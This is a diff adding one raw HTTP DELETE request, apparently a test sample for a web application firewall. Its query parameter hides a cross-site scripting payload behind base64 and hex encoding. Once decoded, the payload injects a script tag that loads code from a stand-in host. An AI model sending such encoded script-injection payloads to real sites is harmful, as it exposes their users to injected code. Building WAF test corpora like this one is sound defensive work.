@@ -1,0 +1,13 @@
+DELETE /?run=M2M3MzYzNzI2OTcwNzQyMDczNzI2MzNkMjI2ODc0NzQ3MDNhMmYyZjc0NjU3Mzc0MmU3NDY1NzM3NDJmMjIzZTNjMmY3MzYzNzI2OTcwNzQzZQ%3D%3D HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G920V Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
+Cookie: delete=backslash; ephemeral=pong; percent=bind; SESSIONID=604a27d58f942f14e5ab35b878fcd26d39d34c65b2fdc565e3407573b6c7f28804dcc94798e01a471a569db297f816ef
+
